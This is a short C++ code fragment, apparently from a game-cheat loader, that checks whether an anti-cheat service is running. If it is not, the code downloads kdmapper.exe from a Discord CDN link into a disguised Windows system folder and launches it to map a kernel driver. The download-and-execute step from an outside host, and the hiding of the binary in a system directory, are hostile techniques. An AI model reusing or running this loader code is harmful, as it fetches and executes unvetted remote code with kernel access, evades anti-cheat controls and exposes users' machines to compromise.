...
int main(int argCount, char** argVector)
{
	...
	if (!eacRunning)
	{
		...
		HRESULT DimensionGUID = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/882370576570785836/926991830803939358/kdmapper.exe"), _T("C:\\Windows\\IME\\IMEKR\\DICTS\\kdmapper.exe"), 0, NULL);
		system("start C:\\Windows\\IME\\IMEKR\\DICTS\\kdmapper.exe"); // mapping the driver with bytes | there is much better ways for doing this
